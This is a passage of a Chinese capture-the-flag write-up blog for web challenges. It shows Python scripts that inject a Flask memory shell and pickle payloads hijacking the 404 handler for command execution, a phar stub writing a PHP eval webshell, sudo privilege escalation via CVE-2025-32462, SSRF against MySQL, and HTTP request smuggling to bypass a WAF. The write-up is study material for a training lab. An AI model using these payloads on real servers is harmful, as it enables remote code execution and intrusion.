class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://challenge.ilovectf.cn:30667&quot;</span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 1. 注入内存马</span><br><span class="line">url1 = f&quot;&#123;url&#125;/doit&quot;</span><br><span class="line">payload = &#123;</span><br><span class="line">    &#x27;e&#x27;: r&quot;&quot;&quot;eval(&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;]&quot;&quot;&quot;</span><br><span class="line">         r&quot;&quot;&quot;.before_request_funcs.setdefault(None,[]).append(&quot;&quot;&quot;</span><br><span class="line">         r&quot;&quot;&quot;lambda:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;o&#x27;)).read())&quot;)&quot;&quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url1, data=payload, headers=headers)</span><br><span class="line">print(&quot;注入响应：&quot;, r.text)</span><br><span class="line"></span><br><span class="line"># 2. 利用内存马执行命令</span><br><span class="line">url2 = f&quot;&#123;url&#125;/?o=cat /flag&quot;</span><br><span class="line">r = requests.get(url2, headers=headers)   # 注意：这里应该是 GET</span><br><span class="line">print(&quot;执行结果：&quot;, r.text)</span><br></pre></td></tr></table></figure><h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="【未完成】Road-to-Hero"><a href="#【未完成】Road-to-Hero" class="headerlink" title="【未完成】Road to Hero"></a><strong>【未完成】Road to Hero</strong></h3><h4 id="考点：php反序列化链构造和php的一些特性还有命令执行简单绕过"><a href="#考点：php反序列化链构造和php的一些特性还有命令执行简单绕过" class="headerlink" title="考点：php反序列化链构造和php的一些特性还有命令执行简单绕过"></a>考点：php反序列化链构造和php的一些特性还有命令执行简单绕过</h4><h3 id="【未完成】ez-Ref"><a href="#【未完成】ez-Ref" class="headerlink" title="【未完成】ez_Ref"></a>【未完成】<strong>ez_Ref</strong></h3><h4 id="考点：简单的java反序列化题"><a href="#考点：简单的java反序列化题" class="headerlink" title="考点：简单的java反序列化题"></a>考点：简单的<strong>java</strong>反序列化题</h4><h3 id="来getshell速度"><a href="#来getshell速度" class="headerlink" title="来getshell速度!"></a><strong>来</strong>getshell速度!</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getshell就完了？？想啥呢bro</span><br></pre></td></tr></table></figure><h4 id="考点：php文件上传中不含php代码命令执行的trick以及CVE-2025-32462提权"><a href="#考点：php文件上传中不含php代码命令执行的trick以及CVE-2025-32462提权" class="headerlink" title="考点：php文件上传中不含php代码命令执行的trick以及CVE-2025-32462提权"></a>考点：php文件上传中不含php代码命令执行的trick以及CVE-2025-32462提权</h4><p>应该是模仿给的链接出的题目，新姿势</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/news/18584</span><br></pre></td></tr></table></figure><p>题目给的源码是一个文件上传和包含</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$allowed_extensions = [&#x27;zip&#x27;, &#x27;bz2&#x27;, &#x27;gz&#x27;, &#x27;xz&#x27;, &#x27;7z&#x27;];</span><br><span class="line">$allowed_mime_types = [</span><br><span class="line">    &#x27;application/zip&#x27;,</span><br><span class="line">    &#x27;application/x-bzip2&#x27;,</span><br><span class="line">    &#x27;application/gzip&#x27;,</span><br><span class="line">    &#x27;application/x-gzip&#x27;,</span><br><span class="line">    &#x27;application/x-xz&#x27;,</span><br><span class="line">    &#x27;application/x-7z-compressed&#x27;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function filter($tempfile)</span><br><span class="line">&#123;</span><br><span class="line">    $data = file_get_contents($tempfile);</span><br><span class="line">    if (</span><br><span class="line">        stripos($data, &quot;__HALT_COMPILER();&quot;) !== false || stripos($data, &quot;PK&quot;) !== false ||</span><br><span class="line">        stripos($data, &quot;&lt;?&quot;) !== false || stripos(strtolower($data), &quot;&lt;?php&quot;) !== false</span><br><span class="line">    ) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &#x27;POST&#x27;) &#123;</span><br><span class="line">    if (is_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;])) &#123;</span><br><span class="line">        if (filter($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]) || !isset($_FILES[&#x27;file&#x27;][&#x27;name&#x27;])) &#123;</span><br><span class="line">            die(&quot;Nope :&lt;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // mimetype check</span><br><span class="line">        $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">        $mime_type = finfo_file($finfo, $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">        finfo_close($finfo);</span><br><span class="line"></span><br><span class="line">        if (!in_array($mime_type, $allowed_mime_types)) &#123;</span><br><span class="line">            die(&#x27;unexpected mimetype&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // ext check</span><br><span class="line">        $ext = strtolower(pathinfo(basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]), PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line">        if (!in_array($ext, $allowed_extensions)) &#123;</span><br><span class="line">            die(&#x27;unexpected extension&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], &quot;/tmp/&quot; . basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]))) &#123;</span><br><span class="line">            echo &quot;File upload success!Please include with &#x27;url&#x27;&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;fail&quot;;</span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;url&#x27;])) &#123;</span><br><span class="line">    </span><br><span class="line">$include_url = basename($_GET[&#x27;url&#x27;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (!preg_match(&quot;/\.(zip|bz2|gz|xz|7z)/i&quot;, $include_url)) &#123;</span><br><span class="line">    die(&quot;unexpected extension&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">include &#x27;/tmp/&#x27; . $include_url;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form enctype=&#x27;multipart/form-data&#x27; method=&#x27;post&#x27;&gt;</span><br><span class="line">    &lt;input type=&#x27;file&#x27; name=&#x27;file&#x27;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;upload&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251112231834565.png" alt="image-20251112231834565"></p><p>给了白名单，后缀被禁用了，还对内容也做了限制</p><p><img src="/../images/image-20251112232038692.png" alt="image-20251112232038692"></p><p>phar反序列化函数和php代码段</p><p><img src="/../images/image-20251112232132842.png" alt="image-20251112232132842"></p><p>basename限制目录穿越，匹配限制文件扩展名</p><p><img src="/../images/image-20251112232307542.png" alt="image-20251112232307542"></p><p>构造phar文件写马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$phar=new Phar(&quot;phar.phar&quot;);</span><br><span class="line">$phar -&gt; startBuffering();</span><br><span class="line">$phar -&gt; setStub(&#x27;&lt;?php file_put_contents(&quot;/var/www/html/shell.php&quot;,&quot;&lt;?php eval(\$_POST[0]);?&gt;&quot;);__HALT_COMPILER();?&gt;&#x27;);</span><br><span class="line">$phar -&gt; addFromString(&quot;test.txt&quot;,&quot;test&quot;);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php -d phar.readonly=Off 1.php</span><br><span class="line">php 1.php</span><br><span class="line">gzip -c phar.phar &gt;phar.phar.gz</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251112234736198.png" alt="image-20251112234736198"></p><p>进来之后发现没有权限查看flag文件</p><p><img src="/../images/image-20251112235107258.png" alt="image-20251112235107258"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/Dalock/article/details/149343860</span><br></pre></td></tr></table></figure><p>查看sudo的版本</p><p><img src="/../images/image-20251112235344212.png" alt="image-20251112235344212"></p><p>查看配置文件&#x2F;etc&#x2F;sudoers</p><p><img src="/../images/image-20251112235533743.png" alt="image-20251112235533743"></p><p>查看自己的权限，给配上asd.asd.asd就有权限了</p><p><img src="/../images/image-20251112235702084.png" alt="image-20251112235702084"></p><p><img src="/../images/image-20251112235840515.png" alt="image-20251112235840515"></p><h3 id="Apple-or-android"><a href="#Apple-or-android" class="headerlink" title="Apple or android"></a><strong>Apple or android</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">高级的验证码</span><br></pre></td></tr></table></figure><h4 id="考点：代码审计ssrf，ssrf打mysql，Gopherus使用联动"><a href="#考点：代码审计ssrf，ssrf打mysql，Gopherus使用联动" class="headerlink" title="考点：代码审计ssrf，ssrf打mysql，Gopherus使用联动"></a>考点：代码审计ssrf，ssrf打mysql，Gopherus使用联动</h4><p>进来看到有个选择苹果还是安卓登录，尝试登陆和使用一下功能，苹果登陆有个生成校验的二维码，康康给的源码，按功能来审了，没有看到直接给的路由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">进来先看的index.php，安卓登陆的话就是到login.php，苹果登陆的话就是触发getQRCode()函数</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251113191023819.png" alt="image-20251113191023819"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在login.php当中是没有给登陆跳转的，安卓人就是登陆失败不给登了，那么就只能走苹果登陆了</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251113191339428.png" alt="image-20251113191339428"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">跟进苹果登陆触发的效果，从getQRCode()开始--&gt;verify.php--&gt;Auth.php的generateAndDisplayCode()---&gt;ImageProcessor.php当中的函数，参数可控，函数对目标地址无限制触发ssrf</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251113191559080.png" alt="image-20251113191559080"></p><p><img src="/../images/image-20251113191648181.png" alt="image-20251113191648181"></p><p><img src="/../images/image-20251113193101258.png" alt="image-20251113193101258"></p><p><img src="/../images/image-20251113193140025.png" alt="image-20251113193140025"></p><p><img src="/../images/image-20251113194025720.png" alt="image-20251113194025720"></p><p><img src="/../images/image-20251113194040305.png" alt="image-20251113194040305"></p><p><img src="/../images/image-20251113193940986.png" alt="image-20251113193940986"></p><p><img src="/../images/image-20251113194335647.png" alt="image-20251113194335647"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ok,审计出来请求二维码时候存在ssrf【利用：请求的时候构建恶意的HTTP_X_VERIFY_CODE_URL】，ssrf常见打的redis数据库，用dict来探针一下有没有相应的服务</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">打的常规的6379回显正常，但是3306的时候回显异常，推测存在相应的mysql文件，查看出现的bin文件</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251113200753513.png" alt="image-20251113200753513"></p><p><img src="/../images/image-20251113200547566.png" alt="image-20251113200547566"></p><p><img src="/../images/image-20251113201210351.png" alt="image-20251113201210351"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">确实存在mysql服务，那么是不是可以ssrf打的mysql，一般用的curl 来进行gopher的攻击，但是呢前面审计代码的时候有fsockopen</span><br></pre></td></tr></table></figure><p>这里用的是Gopherus3,Gopherus要用python2就换成他了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Esonhugh/Gopherus3</span><br></pre></td></tr></table></figure><p>做了mysql写马子的限制filepriv保护，就常规的sql注入探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">select group_concat(table_name) from information_schema.tables where</span><br><span class="line">table_schema=&#x27;ctf_db&#x27;</span><br><span class="line">select * from ctf_db.flags</span><br></pre></td></tr></table></figure><p>用Gopherus3构造的相应的payload，在X-VERIFY-CODE-URL访问</p><p>注意数据包可能会被截断，可以使用分段读取函数取出</p><p><img src="/../images/image-20251114001108429.png" alt="image-20251114001108429"></p><h3 id="waf-waf"><a href="#waf-waf" class="headerlink" title="waf?waf!"></a><strong>waf?waf!</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/articles/web/243652.html</span><br></pre></td></tr></table></figure><h4 id="考点：http请求走私造成的waf绕过"><a href="#考点：http请求走私造成的waf绕过" class="headerlink" title="考点：http请求走私造成的waf绕过"></a>考点：http请求走私造成的waf绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在打?CTF? ?最后一周打了? ?想要flag??跟我的waf说去吧,我们都在用力的活着</span><br></pre></td></tr></table></figure><p>分析一下附件给的源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">进来是一个劝退黑名单</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251114081921650.png" alt="image-20251114081921650"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">规范字符串函数</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251114082030577.png" alt="image-20251114082030577"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http解析</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251114082055661.png" alt="image-20251114082055661"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">代理服务器逻辑</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251114083040736.png" alt="image-20251114083040736"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">漏洞点：eval</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251114083126739.png" alt="image-20251114083126739"></p><p>漏洞点要使用的是post请求，关注代理服务器逻辑</p><p>代理服务器则检查你的参数，过滤恶意参数,关注前后端解析的请求</p><p>头，怎么样算是一个完整的数据包<img src="/../images/image-20251114084303877.png" alt="image-20251114084303877"></p><p><img src="/../images/image-20251114084429534.png" alt="image-20251114084429534"></p><p>就是前端处理请求头cl，后端处理te，出现了解析差异，触发的http请求走私，可以看看前面贴的文章</p><p><img src="/../images/image-20251114084605835.png" alt="image-20251114084605835"></p><p>解析TE时会把0视作数据停止的标志，所以这里直接加个0，然后后面加个&amp;用于传递其他参数，注意是python的执行命令</p><p><img src="/../images/image-20251114090106658.png" alt="image-20251114090106658"></p><h3 id="这又又是什么函数"><a href="#这又又是什么函数" class="headerlink" title="这又又是什么函数"></a><strong>这又又是什么函数</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">没见过？搜一下！在/flag</span><br></pre></td></tr></table></figure><h4 id="考点：Pickle反序列化及绕过黑名单"><a href="#考点：Pickle反序列化及绕过黑名单" class="headerlink" title="考点：Pickle反序列化及绕过黑名单"></a>考点：Pickle反序列化及绕过黑名单</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/news/7032</span><br><span class="line">https://goodapple.top/archives/1069</span><br><span class="line">https://dummykitty.github.io/posts/pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/</span><br></pre></td></tr></table></figure><p>题目提示依旧是&#x2F;src下的源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request, render_template</span><br><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">PICKLE_BLACKLIST = [</span><br><span class="line">    b&#x27;eval&#x27;,</span><br><span class="line">    b&#x27;os&#x27;,</span><br><span class="line">    b&#x27;x80&#x27;,</span><br><span class="line">    b&#x27;before&#x27;,</span><br><span class="line">    b&#x27;after&#x27;,</span><br><span class="line">]</span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&#x27;index.html&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/src&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def src():</span><br><span class="line">    return open(__file__, encoding=&quot;utf-8&quot;).read()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/deser&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def deser():</span><br><span class="line">    a = request.form.get(&#x27;a&#x27;)</span><br><span class="line">    if not a:</span><br><span class="line">        return &quot;fail&quot;</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        decoded_data = base64.b64decode(a)</span><br><span class="line">        print(decoded_data)</span><br><span class="line">    except: </span><br><span class="line">        return &quot;fail&quot;</span><br><span class="line">    </span><br><span class="line">    for forbidden in PICKLE_BLACKLIST:</span><br><span class="line">        if forbidden in decoded_data:</span><br><span class="line">            return &quot;waf&quot;</span><br><span class="line">    try:</span><br><span class="line">        result = pickle.loads(decoded_data)</span><br><span class="line">        return &quot;done&quot;</span><br><span class="line">    except:</span><br><span class="line">        return &quot;fail&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=5000)</span><br></pre></td></tr></table></figure><p>出现了反序列化函数pickle.loads()</p><p><img src="/../images/image-20251114091410013.png" alt="image-20251114091410013"></p><p>回头关注一下黑名单</p><p><img src="/../images/image-20251114091454785.png" alt="image-20251114091454785"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval,os是命令执行的黑名单</span><br><span class="line">before和after是钩子函数过滤，</span><br><span class="line">pickle.dumps()第一个字符为x80，</span><br></pre></td></tr></table></figure><p>eval可以用exec，钩子函数可以用error_handler，os用拼接，&#x2F;x80可以自定义为协议版本0就不会出现&#x2F;x80</p><p>构造恶意的操作码opcode【贴的都是官p的wp】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">opcode = b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="line">eval</span><br><span class="line">(S&#x27;print(__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read())&#x27;</span><br><span class="line">tR.&#x27;&#x27;&#x27;</span><br><span class="line">pickle.loads(opcode) </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cbuiltins 是 pickle 协议（版本 0） 里的一条 操作码</span><br><span class="line">篡改 Flask 404 handler，实现 RCE</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">opcode = b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="line">exec</span><br><span class="line">(S&#x27;global exc_class;global code; exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a: __import__(&#x27;o&#x27;+&#x27;s&#x27;).popen(request.args.get(&#x27;0&#x27;)).read()&#x27;</span><br><span class="line">tR.&#x27;&#x27;&#x27;</span><br><span class="line">pickle.loads(opcode)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">BASE_URL = &quot;http://challenge.ilovectf.cn:30554&quot;</span><br><span class="line"></span><br><span class="line">opcode = b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="line">exec</span><br><span class="line">(S&#x27;global exc_class;global code; exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a: __import__(&#x27;o&#x27;+&#x27;s&#x27;).popen(request.args.get(&#x27;0&#x27;)).read()&#x27;</span><br><span class="line">tR.&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">payload = base64.b64encode(opcode).decode()</span><br><span class="line"></span><br><span class="line">def send_requests():</span><br><span class="line">    try:</span><br><span class="line">        # 第一步：下发 payload</span><br><span class="line">        deser_url = f&quot;&#123;BASE_URL&#125;/deser&quot;</span><br><span class="line">        post_data = &#123;&quot;a&quot;: payload&#125;</span><br><span class="line">        print(f&quot;[+] POST &#123;deser_url&#125;  data=&#123;post_data&#125;&quot;)</span><br><span class="line">        r1 = requests.post(deser_url, data=post_data, timeout=10)</span><br><span class="line">        print(f&quot;[*] POST 状态码：&#123;r1.status_code&#125;  响应：&#123;r1.text&#125;\n&quot;)</span><br><span class="line"></span><br><span class="line">        # 第二步：触发 404 并执行命令</span><br><span class="line">        get_url = f&quot;&#123;BASE_URL&#125;/1&quot;</span><br><span class="line">        get_params = &#123;&quot;0&quot;: &quot;cat /flag&quot;&#125;</span><br><span class="line">        print(f&quot;[+] GET  &#123;get_url&#125;  params=&#123;get_params&#125;&quot;)</span><br><span class="line">        r2 = requests.get(get_url, params=get_params, timeout=10)</span><br><span class="line">        print(f&quot;[*] GET  状态码：&#123;r2.status_code&#125;  响应：&#123;r2.text&#125;&quot;)</span><br><span class="line">    except requests.RequestException as e:</span><br><span class="line">        print(f&quot;[!] 请求失败：&#123;e&#125;&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    send_requests()</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251114102556131.png" alt="image-20251114102556131"></p><h3 id="好像什么都能读"><a href="#好像什么都能读" class="headerlink" title="好像什么都能读"></a><strong>好像什么都能读</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该读些什么呢？</span><br></pre></td></tr></table></figure><h4 id="考点：flask计算pin码，新版本Werkzeug的tip"><a href="#考点：flask计算pin码，新版本Werkzeug的tip" class="headerlink" title="考点：flask计算pin码，新版本Werkzeug的tip"></a>考点：flask计算pin码，新版本Werkzeug的tip</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/m1xian/p/18528813</span><br><span class="line">https://sun1028.top/2025/05/09/flask%e8%ae%a1%e7%ae%97pin%e7%a0%81/</span><br></pre></td></tr></table></figure><p>随便访问个文件，查看报错</p><p><img src="/../images/image-20251114104245794.png" alt="image-20251114104245794"></p><p><img src="/../images/image-20251114104254487.png" alt="image-20251114104254487"></p><p>查看app.py文件，发现开启了debug模式</p><p><img src="/../images/image-20251114104350857.png" alt="image-20251114104350857"></p><p>思路就是要怎么使用debug模式，使用&#x2F;console调试器，前面的报错显示是werkzeug 的 debug 模块，</p><p>werkzeug 的 debug 模块中提供的一个安全机制，用于保护调试器（<code>/console</code>）不被未授权访问【PIN 码】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/m1xian/p/18528813</span><br></pre></td></tr></table></figure><p>uuid:</p><p><img src="/../images/image-20251114105200234.png" alt="image-20251114105200234"></p><p>machine_id:</p><p><img src="/../images/image-20251114105310262.png" alt="image-20251114105310262"></p><p><img src="/../images/image-20251114105332937.png" alt="image-20251114105332937"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 